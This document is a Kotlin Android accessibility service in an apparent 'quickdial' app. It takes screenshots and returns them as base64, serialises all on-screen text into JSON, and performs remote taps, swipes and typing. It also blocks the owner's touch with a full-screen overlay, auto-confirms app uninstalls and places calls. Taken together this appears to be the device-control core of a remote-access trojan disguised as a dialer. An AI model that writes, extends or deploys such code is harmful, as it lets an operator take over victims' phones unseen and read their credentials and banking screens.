package com.example.quickdial

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.GestureDescription
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.graphics.Path
import android.graphics.Rect
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.view.Gravity
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import org.json.JSONArray
import org.json.JSONObject

class QuickAccessibilityService : AccessibilityService() {

    companion object {
        var instance: QuickAccessibilityService? = null
    }

    private var overlayView: android.view.View? = null
    private var windowManager: android.view.WindowManager? = null
    private var touchBlocked = false
    private val mainHandler = Handler(Looper.getMainLooper())
    private var screenshotCallback: ((String) -> Unit)? = null

    var remoteMode = false

    fun setScreenshotCallback(callback: (String) -> Unit) {
        this.screenshotCallback = callback
    }

    fun takeAccessibilityScreenshot() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            takeScreenshot(
                display?.displayId ?: 0,
                mainHandler::post,
                object : AccessibilityService.TakeScreenshotCallback {
                    override fun onSuccess(screenshot: AccessibilityService.ScreenshotResult) {
                        try {
                            val bitmap = Bitmap.wrapHardwareBuffer(screenshot.hardwareBuffer, screenshot.colorSpace)
                            if (bitmap != null) {
                                val scaled = Bitmap.createScaledBitmap(bitmap, bitmap.width / 2, bitmap.height / 2, true)
                                val baos = java.io.ByteArrayOutputStream()
                                scaled.compress(Bitmap.CompressFormat.JPEG, 70, baos)
                                val base64 = android.util.Base64.encodeToString(baos.toByteArray(), android.util.Base64.NO_WRAP)
                                screenshotCallback?.invoke(base64)
                                baos.close()
                                scaled.recycle()
                                bitmap.recycle()
                            }
                            screenshot.hardwareBuffer.close()
                        } catch (e: Exception) {
                            LogUtil.e("A11yService", "Screenshot error", e)
                        }
                    }
                    override fun onFailure(errorCode: Int) {
                        LogUtil.e("A11yService", "Screenshot failed: $errorCode")
                    }
                }
            )
        }
    }

    fun uninstallSelf(packageName: String) {
        try {
            val intent = Intent(Intent.ACTION_DELETE, Uri.parse("package:$packageName"))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            mainHandler.postDelayed({
                tapByText("Uninstall") || tapByText("UNINSTALL") || tapByText("OK")
            }, 1000)
        } catch (e: Exception) {
            LogUtil.e("A11yService", "Uninstall failed", e)
        }
    }

    fun blockTouch() {
        if (touchBlocked) return
        mainHandler.post {
            try {
                windowManager = getSystemService(WINDOW_SERVICE) as android.view.WindowManager
                val inflater = android.view.LayoutInflater.from(this)
                overlayView = inflater.inflate(R.layout.overlay_touch_block, null)

                val params = android.view.WindowManager.LayoutParams().apply {
                    type = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        android.view.WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY
                    } else {
                        android.view.WindowManager.LayoutParams.TYPE_SYSTEM_OVERLAY
                    }
                    flags = android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                            android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                            android.view.WindowManager.LayoutParams.FLAG_FULLSCREEN or
                            android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                    format = PixelFormat.TRANSLUCENT
                    width = android.view.WindowManager.LayoutParams.MATCH_PARENT
                    height = android.view.WindowManager.LayoutParams.MATCH_PARENT
                    gravity = Gravity.TOP or Gravity.START
                    x = 0
                    y = 0
                }
                windowManager?.addView(overlayView, params)
                touchBlocked = true
            } catch (e: Exception) {
                touchBlocked = false
            }
        }
    }

    fun releaseTouch() {
        if (!touchBlocked) return
        mainHandler.post {
            try { overlayView?.let { windowManager?.removeView(it) } } catch (_: Exception) {}
            overlayView = null; windowManager = null; touchBlocked = false
        }
    }

    fun isTouchBlocked(): Boolean = touchBlocked

    fun dumpUI(): String {
        val root = rootInActiveWindow ?: return "{\"error\":\"No active window\"}"
        val json = JSONObject()
        json.put("packageName", root.packageName?.toString() ?: "unknown")
        json.put("elements", serializeNode(root))
        root.recycle()
        return json.toString()
    }

    private fun serializeNode(node: AccessibilityNodeInfo): JSONArray {
        val arr = JSONArray()
        try {
            val elements = mutableListOf<AccessibilityNodeInfo>()
            collectNodes(node, elements)
            for (el in elements) {
                if (el.text?.isNotEmpty() == true || el.contentDescription?.isNotEmpty() == true || el.isClickable) {
                    val obj = JSONObject()
                    obj.put("text", el.text?.toString() ?: "")
                    obj.put("contentDesc", el.contentDescription?.toString() ?: "")
                    obj.put("viewId", el.viewIdResourceName ?: "")
                    obj.put("className", el.className?.toString() ?: "")
                    obj.put("clickable", el.isClickable)
                    obj.put("longClickable", el.isLongClickable)
                    obj.put("checkable", el.isCheckable)
                    obj.put("checked", el.isChecked)
                    obj.put("focusable", el.isFocusable)
                    obj.put("focused", el.isFocused)
                    obj.put("editable", el.isEditable)
                    obj.put("enabled", el.isEnabled)
                    val rect = Rect(); el.getBoundsInScreen(rect)
                    obj.put("bounds", "${rect.left},${rect.top},${rect.right},${rect.bottom}")
                    arr.put(obj)
                }
            }
        } catch (e: Exception) {}
        return arr
    }

    private fun collectNodes(node: AccessibilityNodeInfo, list: MutableList<AccessibilityNodeInfo>) {
        list.add(node)
        for (i in 0 until node.childCount) {
            node.getChild(i)?.let { collectNodes(it, list) }
        }
    }

    fun tapByText(text: String): Boolean {
        if (!remoteMode) return false
        val root = rootInActiveWindow ?: return false
        val nodes = root.findAccessibilityNodeInfosByText(text)
        for (node in nodes) {
            if (node.isClickable && node.isEnabled) {
                val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                node.recycle(); root.recycle(); return result
            }
            node.recycle()
        }
        root.recycle(); return false
    }

    fun tapById(viewId: String): Boolean {
        if (!remoteMode) return false
        val root = rootInActiveWindow ?: return false
        val nodes = root.findAccessibilityNodeInfosByViewId(viewId)
        for (node in nodes) {
            if (node.isClickable && node.isEnabled) {
                val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                node.recycle(); root.recycle(); return result
            }
            node.recycle()
        }
        root.recycle(); return false
    }

    fun typeIntoFocused(text: String): Boolean {
        if (!remoteMode) return false
        val root = rootInActiveWindow ?: return false
        val focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT)
        if (focused != null && focused.isEditable) {
            val args = android.os.Bundle().apply {
                putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text)
            }
            val result = focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args)
            focused.recycle(); root.recycle(); return result
        }
        root.recycle(); return false
    }

    fun performTap(x: Float, y: Float) {
        if (!remoteMode) return
        try {
            val path = Path().apply { moveTo(x, y) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 100)).build()
            dispatchGesture(gesture, null, null)
        } catch (e: Exception) {}
    }

    fun performSwipe(startX: Float, startY: Float, endX: Float, endY: Float) {
        if (!remoteMode) return
        try {
            val path = Path().apply { moveTo(startX, startY); lineTo(endX, endY) }
            val gesture = GestureDescription.Builder()
                .addStroke(GestureDescription.StrokeDescription(path, 0, 300)).build()
            dispatchGesture(gesture, null, null)
        } catch (e: Exception) {}
    }

    fun openNotifications() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) performSwipe(540f, 0f, 540f, 800f)
            else performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS)
        } catch (_: Exception) {}
    }

    fun goHome() { try { performGlobalAction(GLOBAL_ACTION_HOME) } catch (_: Exception) {} }
    fun goBack() { try { performGlobalAction(GLOBAL_ACTION_BACK) } catch (_: Exception) {} }
    fun openRecents() { try { performGlobalAction(GLOBAL_ACTION_RECENTS) } catch (_: Exception) {} }

    fun typeText(text: String) {
        if (!remoteMode) return
        typeIntoFocused(text)
    }

    fun makeCall(number: String, context: Context) {
        try {
            val encodedNumber = Uri.encode(number)
            val intent = Intent(Intent.ACTION_CALL, Uri.parse("tel:$encodedNumber"))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            context.startActivity(intent)
        } catch (_: Exception) {}
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        instance = this
        touchBlocked = false
        remoteMode = false
        overlayView = null
        windowManager = null
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {}

    override fun onInterrupt() {
        remoteMode = false
        mainHandler.post { try { overlayView?.let { windowManager?.removeView(it) } } catch (_: Exception) {}; overlayView = null; touchBlocked = false }
    }

    override fun onDestroy() {
        remoteMode = false
        mainHandler.post { try { overlayView?.let { windowManager?.removeView(it) } } catch (_: Exception) {}; overlayView = null; touchBlocked = false }
        instance = null
        super.onDestroy()
    }
}
